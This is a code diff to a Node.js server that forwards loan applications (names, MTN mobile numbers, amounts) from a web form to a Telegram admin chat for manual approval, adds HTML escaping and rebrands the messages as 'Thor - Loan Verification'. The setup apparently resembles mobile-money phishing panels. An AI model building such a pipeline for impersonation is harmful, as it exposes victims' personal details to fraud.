@@ -14,28 +14,68 @@ const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
 const loans = {};
 let lastUpdateId = 0;
 
+// Prevent HTML injection if a user types <, >, or & in the form
+function escapeHtml(text) {
+    return String(text || '')
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;');
+}
+
+// Helper to format the Thor - Loan Verification message with Bold + Tap-to-Copy values
+function buildThorMessage(record, statusText, updatedTime = null) {
+    const lines = [
+        '⚡ <b>THOR - LOAN VERIFICATION</b>',
+        '<b>LOAN APPLICATION RECEIVED</b>',
+        '',
+        '<b>USER DETAILS</b>',
+        '━━━━━━━━━━━━━━━━━━━━',
+        `👤 Full Name: <b><code>${escapeHtml(record.fullName)}</code></b>`,
+        `📱 MTN Number: <b><code>${escapeHtml(record.mtnNumber)}</code></b>`,
+        '',
+        '<b>LOAN DETAILS</b>',
+        '━━━━━━━━━━━━━━━━━━━━',
+        `🆔 Reference ID: <b><code>${escapeHtml(record.id)}</code></b>`,
+        `💼 Loan Service: <b><code>${escapeHtml(record.loanService)}</code></b>`,
+        `💰 Loan Amount: <b><code>${escapeHtml(record.loanAmount)}</code></b>`,
+        `📅 Repayment Period: <b><code>${escapeHtml(record.repaymentPeriod)}</code></b>`,
+        '',
+        '<b>STATUS</b>',
+        '━━━━━━━━━━━━━━━━━━━━',
+        `Status: <b>${escapeHtml(statusText)}</b>`
+    ];
+
+    if (updatedTime) {
+        lines.push(`Status Updated: <b><code>${escapeHtml(updatedTime)}</code></b>`);
+    }
+
+    return lines.join('\n');
+}
+
 // 1. Receive Application from public/index.html -> Send to Telegram
 app.post('/api/loans/apply', async (req, res) => {
     const { fullName, mtnNumber, loanService, loanAmount, repaymentPeriod } = req.body;
     const id = 'LOAN-' + Math.floor(100000 + Math.random() * 900000);
 
-    loans[id] = { id, fullName, mtnNumber, loanService, loanAmount, repaymentPeriod, status: 'PENDING' };
+    const record = {
+        id,
+        fullName,
+        mtnNumber,
+        loanService,
+        loanAmount,
+        repaymentPeriod,
+        status: 'PENDING'
+    };
 
-    const message = [
-        '🔔 *NEW MTN MOMO LOAN REQUEST*',
-        `🆔 *ID:* \`${id}\``,
-        `👤 *Name:* ${fullName}`,
-        `📱 *MTN Number:* ${mtnNumber}`,
-        `💼 *Service:* ${loanService}`,
-        `💰 *Amount:* ${loanAmount}`,
-        `📅 *Period:* ${repaymentPeriod}`
-    ].join('\n');
+    loans[id] = record;
+
+    const message = buildThorMessage(record, '⏳ PENDING REVIEW');
 
     try {
         await axios.post(`${TELEGRAM_API}/sendMessage`, {
             chat_id: ADMIN_CHAT_ID,
             text: message,
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
             reply_markup: {
                 inline_keyboard: [[
                     { text: '✅ Approve Loan', callback_data: `APPROVE:${id}` },
@@ -51,7 +91,7 @@ app.post('/api/loans/apply', async (req, res) => {
     }
 });
 
-// 2. Frontend Polls This Endpoint While Waiting for Approval
+// 2. Frontend Polls This Endpoint While Spinner Runs
 app.get('/api/loans/status/:id', (req, res) => {
     const record = loans[req.params.id];
     if (!record) return res.status(404).json({ status: 'NOT_FOUND' });
@@ -72,35 +112,46 @@ async function pollTelegramUpdates() {
             if (update.callback_query) {
                 const cb = update.callback_query;
                 const [decision, id] = cb.data.split(':');
+                const isApproved = decision === 'APPROVE';
+                const updatedTime = new Date().toLocaleString();
 
                 if (loans[id]) {
-                    loans[id].status = decision === 'APPROVE' ? 'APPROVED' : 'REJECTED';
+                    loans[id].status = isApproved ? 'APPROVED' : 'REJECTED';
                 }
 
                 await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
                     callback_query_id: cb.id,
-                    text: decision === 'APPROVE' ? 'Loan Approved!' : 'Loan Declined!'
+                    text: isApproved ? 'Loan Approved!' : 'Loan Declined!'
                 });
+
+                const updatedText = loans[id]
+                    ? buildThorMessage(
+                          loans[id],
+                          isApproved ? '✅ APPROVED' : '❌ DECLINED',
+                          updatedTime
+                      )
+                    : `${escapeHtml(cb.message.text)}\n\nStatus: <b>${isApproved ? '✅ APPROVED' : '❌ DECLINED'}</b>\nStatus Updated: <b><code>${escapeHtml(updatedTime)}</code></b>`;
 
                 await axios.post(`${TELEGRAM_API}/editMessageText`, {
                     chat_id: cb.message.chat.id,
                     message_id: cb.message.message_id,
-                    text: `${cb.message.text}\n\n*Admin Decision:* ${decision === 'APPROVE' ? '✅ APPROVED' : '❌ DECLINED'}`,
-                    parse_mode: 'Markdown'
+                    text: updatedText,
+                    parse_mode: 'HTML'
                 });
             }
         }
     } catch (err) {
-        // Ignore timeout/network hiccups and retry
+        // Retry automatically on network hiccup
     } finally {
         setTimeout(pollTelegramUpdates, 1000);
     }
 }
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running at http://localhost:${PORT}`);
-    pollTelegramUpdates();
+app.listen(PORT, async () => {
+    console.log(`Thor Loan Verification Server running at http://localhost:${PORT}`);
+    if (BOT_TOKEN) {
+        await axios.get(`${TELEGRAM_API}/deleteWebhook`).catch(() => {});
+        pollTelegramUpdates();
+    }
 });
-
-
